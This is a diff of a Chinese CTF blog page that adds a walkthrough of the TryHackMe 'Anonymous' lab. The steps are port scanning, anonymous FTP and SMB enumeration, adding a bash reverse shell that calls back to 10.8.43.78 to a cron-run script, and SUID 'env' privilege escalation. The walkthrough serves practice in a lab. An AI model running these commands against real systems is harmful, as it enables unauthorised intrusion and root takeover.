@@ -14,7 +14,7 @@
 
 <html lang="zh-cn"><head>
     <meta charset="utf-8" />
-    <title>HTB | 遥乡书屋</title>
+    <title>Anonymous | 遥乡书屋</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="M1st0ry's blog" />
     <meta name="keywords" content="Documentation, CTF, HTB, M1st0ry" />
@@ -30,13 +30,381 @@
 <link rel="icon" type="image/png" sizes="32x32" href="https://c0ld1nk.github.io/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="https://c0ld1nk.github.io/favicon-16x16.png">
 <link rel="manifest" crossorigin="use-credentials" href="https://c0ld1nk.github.io/site.webmanifest">
-<meta property="og:title" content="HTB" />
-<meta property="og:description" content="" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://c0ld1nk.github.io/docs/htb/" /><meta property="og:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_ba59b82d95993faf.png"/><meta name="twitter:card" content="summary_large_image"/>
-<meta name="twitter:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_ba59b82d95993faf.png"/>
-<meta name="twitter:title" content="HTB"/>
-<meta name="twitter:description" content=""/>
+<meta property="og:title" content="Anonymous" />
+<meta property="og:description" content="根据题目先扫端口
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  sudo nmap -p 1-5000 -sV -O -v 10.10.121.117
+  
+  
+
+
+
+
+
+  
+    
+  
+
+能看见有ftp，ssh和smb
+接着连接ftp
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  ftp 10.10.121.117
+Anonymous
+  
+  
+连接成功，找到三个文件，有一个sh文件
+接着枚举smb
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  smbclient -L \\\\10.10.121.117
+  
+  
+
+
+
+
+
+  
+    
+  
+
+有共享文件夹pic，访问
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  smbclient \\\\10.10.121.117\pics
+  
+  
+只有图片
+返回ftp，修改sh文件，弹shell
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  bash -i &gt;&amp; /dev/tcp/10.8.43.78/11451 0&gt;&amp;1
+  
+  
+上传
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  append clean.sh
+  
+  
+等待计划任务执行获得shell
+之后提权，上传linpeas或者找suid都行
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  find / -perm -u=s -type f 2&gt;/dev/null
+  
+  
+两个都能发现env
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  env /bin/sh -p
+  
+  
+提权成功" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://c0ld1nk.github.io/docs/thm/%E9%9D%B6%E5%9C%BA/anonymous/" /><meta property="og:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_b33c0c9ab4f0fe53.png"/><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2025-06-08T15:14:30+08:00" />
+<meta property="article:modified_time" content="2025-06-08T15:14:30+08:00" /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://c0ld1nk.github.io/opengraph/card-base-2_hu_b33c0c9ab4f0fe53.png"/>
+<meta name="twitter:title" content="Anonymous"/>
+<meta name="twitter:description" content="根据题目先扫端口
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  sudo nmap -p 1-5000 -sV -O -v 10.10.121.117
+  
+  
+
+
+
+
+
+  
+    
+  
+
+能看见有ftp，ssh和smb
+接着连接ftp
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  ftp 10.10.121.117
+Anonymous
+  
+  
+连接成功，找到三个文件，有一个sh文件
+接着枚举smb
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  smbclient -L \\\\10.10.121.117
+  
+  
+
+
+
+
+
+  
+    
+  
+
+有共享文件夹pic，访问
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  smbclient \\\\10.10.121.117\pics
+  
+  
+只有图片
+返回ftp，修改sh文件，弹shell
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  bash -i &gt;&amp; /dev/tcp/10.8.43.78/11451 0&gt;&amp;1
+  
+  
+上传
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  append clean.sh
+  
+  
+等待计划任务执行获得shell
+之后提权，上传linpeas或者找suid都行
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  find / -perm -u=s -type f 2&gt;/dev/null
+  
+  
+两个都能发现env
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  
+  
+  env /bin/sh -p
+  
+  
+提权成功"/>
 
     
         <link rel="alternate" type="application/atom+xml" title="Atom feed for 遥乡书屋" href="/index.xml" />
@@ -117,11 +485,11 @@
                 
                     
                     
-                        <li class="sidebar-dropdown no-icon current active">
+                        <li class="sidebar-dropdown no-icon ">
                             <button class="btn">
                                 HTB
                             </button>
-                            <div class="sidebar-submenu d-block">
+                            <div class="sidebar-submenu ">
                                 <ul>
                                     
                                         
@@ -214,25 +582,25 @@
                 
                     
                     
-                        <li class="sidebar-dropdown no-icon ">
+                        <li class="sidebar-dropdown no-icon current active">
                             <button class="btn">
                                 THM
                             </button>
-                            <div class="sidebar-submenu ">
+                            <div class="sidebar-submenu d-block">
                                 <ul>
                                     
                                         
                                         
-                                            <li class="sidebar-dropdown nested no-icon ">
+                                            <li class="sidebar-dropdown nested no-icon current active">
                                                 <button class="btn">
                                                     靶场
                                                 </button>
-                                                <div class="sidebar-submenu ">
+                                                <div class="sidebar-submenu d-block">
                                                     <ul>
                                                         
                                                             
                                                             
-                                                                <li class=" no-icon"><a class="sidebar-nested-link" href="https://c0ld1nk.github.io/docs/thm/%E9%9D%B6%E5%9C%BA/anonymous/">Anonymous</a></li>
+                                                                <li class="current no-icon"><a class="sidebar-nested-link" href="https://c0ld1nk.github.io/docs/thm/%E9%9D%B6%E5%9C%BA/anonymous/">Anonymous</a></li>
                                                             
                                                         
                                                     </ul>
@@ -383,10 +751,26 @@
                     <meta itemprop="position" content='1' />
                 </li>
             
+            
+                <li class="breadcrumb-item text-capitalize" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/docs/thm/">
+                        <span itemprop="name">THM</span>
+                    </a>
+                    <meta itemprop="position" content='2' />
+                </li>
+            
+            
+                <li class="breadcrumb-item text-capitalize" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/docs/thm/%E9%9D%B6%E5%9C%BA/">
+                        <span itemprop="name">靶场</span>
+                    </a>
+                    <meta itemprop="position" content='3' />
+                </li>
+            
         
             <li class="breadcrumb-item text-capitalize active" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
-                <span itemprop="name">HTB</span>
-                <meta itemprop="position" content='2' />
+                <span itemprop="name">Anonymous</span>
+                <meta itemprop="position" content='4' />
             </li>
         
     </ul>
@@ -394,13 +778,13 @@
                                     
                                     <div class="row flex-xl-nowrap">
                                         
-                                        <div class="docs-toc col-xl-3 visually-hidden visually-hidden  d-xl-block"><toc>
+                                        <div class="docs-toc col-xl-3  visually-hidden  d-xl-block"><toc>
     <div class="fw-bold text-uppercase mb-2">On this page</div>
     <nav id="TableOfContents"></nav>
     </toc></div>
                                         
                                         
-                                        <div class="docs-toc-mobile visually-hidden visually-hidden  d-print-none d-xl-none">
+                                        <div class="docs-toc-mobile  visually-hidden  d-print-none d-xl-none">
                                             <button id="toc-dropdown-btn" class="btn-secondary dropdown-toggle" type="button" data-bs-toggle="dropdown" data-bs-offset="0,0" aria-expanded="false">
                                                 Table of Contents
                                             </button>
@@ -409,54 +793,221 @@
                                             <div class="mb-0 d-flex">
                                                 
                                                 <h1 class="content-title mb-0">
-                                                    HTB
+                                                    Anonymous
                                                     
                                                 </h1>
                                             </div>
                                             
                                             <div id="content" class="main-content" >
                                                 
-    <div class="row flex-xl-wrap">
-        
-        <div id="list-item" class="col-md-4 col-12 mt-4 pt-2">
-            <a class="text-decoration-none text-reset" href="https://c0ld1nk.github.io/docs/htb/%E9%9D%B6%E5%9C%BA/">
-                <div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1">
-                    <span class="icon-color d-flex my-3">
-                        <i class="material-icons align-middle">article</i>
-                        
-                        <i class="material-icons icon-faint align-middle ms-auto" title="Directory">folder</i>
-                    </span>
-                    <div class="card-body p-0 content">
-                        <p class="fs-5 fw-semibold card-title mb-1">靶场</p>
-                        <p class="para card-text mb-0"></p>
-                    </div>
-                    
-                </div>
-            </a>
-        </div>
-        
-        <div id="list-item" class="col-md-4 col-12 mt-4 pt-2">
-            <a class="text-decoration-none text-reset" href="https://c0ld1nk.github.io/docs/htb/sherlock/">
-                <div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1">
-                    <span class="icon-color d-flex my-3">
-                        <i class="material-icons align-middle">article</i>
-                        
-                        <i class="material-icons icon-faint align-middle ms-auto" title="Directory">folder</i>
-                    </span>
-                    <div class="card-body p-0 content">
-                        <p class="fs-5 fw-semibold card-title mb-1">Sherlock</p>
-                        <p class="para card-text mb-0"></p>
-                    </div>
-                    
-                </div>
-            </a>
-        </div>
-        
+    
+    <div data-prismjs-copy="" data-prismjs-copy-success="" data-prismjs-copy-error="">
+        <p>根据题目先扫端口</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="9af3135" class="language- ">
+  <code>sudo nmap -p 1-5000 -sV -O -v 10.10.121.117</code>
+  </pre>
+  </div>
+<p>
+
+
+
+
+  
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250608151610245.png" alt="" loading="lazy">
+  
+</p>
+<p>能看见有ftp，ssh和smb</p>
+<p>接着连接ftp</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="ec33d9a" class="language-shell ">
+  <code>ftp 10.10.121.117
+Anonymous</code>
+  </pre>
+  </div>
+<p>连接成功，找到三个文件，有一个sh文件</p>
+<p>接着枚举smb</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="ae5a4df" class="language-shell ">
+  <code>smbclient -L \\\\10.10.121.117</code>
+  </pre>
+  </div>
+<p>
+
+
+
+
+  
+    <img src="https://gitee.com/inklong/blog-pic/raw/master/images/20250608151610239.png" alt="" loading="lazy">
+  
+</p>
+<p>有共享文件夹pic，访问</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="fed417e" class="language-shell ">
+  <code>smbclient \\\\10.10.121.117\pics</code>
+  </pre>
+  </div>
+<p>只有图片</p>
+<p>返回ftp，修改sh文件，弹shell</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="97060a1" class="language-sh ">
+  <code>bash -i &gt;&amp; /dev/tcp/10.8.43.78/11451 0&gt;&amp;1</code>
+  </pre>
+  </div>
+<p>上传</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="30bd23c" class="language-shell ">
+  <code>append clean.sh</code>
+  </pre>
+  </div>
+<p>等待计划任务执行获得shell</p>
+<p>之后提权，上传linpeas或者找suid都行</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="0ab825f" class="language-shell ">
+  <code>find / -perm -u=s -type f 2&gt;/dev/null</code>
+  </pre>
+  </div>
+<p>两个都能发现env</p>
+
+
+
+  
+  
+  
+
+  
+  
+  
+  
+
+  
+
+  <div class="prism-codeblock ">
+  <pre id="d7bae51" class="language-shell ">
+  <code>env /bin/sh -p</code>
+  </pre>
+  </div>
+<p>提权成功</p>
+
     </div>
 
+    
+
+    
                                             </div>
                                             <div><hr class="doc-hr">
 <div id="doc-nav" class="d-print-none">
+
+	<div class="row flex-xl-nowrap flex-row-reverse">
+	<div class="col-sm-6 pt-2 doc-prev">
+		<a class="ms-auto" href="/docs/htb/sherlock/bft/">
+			<div class="card h-100 my-1 text-end">
+				<div class="card-body py-2">
+                    <p class="card-title fs-5 fw-semibold lh-base mb-0">BFT <i class="material-icons align-middle">navigate_next</i></p>
+					
+				</div>
+			</div>
+		</a>
+        </div>
+	</div>
 </div></div>
                                         </div>
                                     </div>
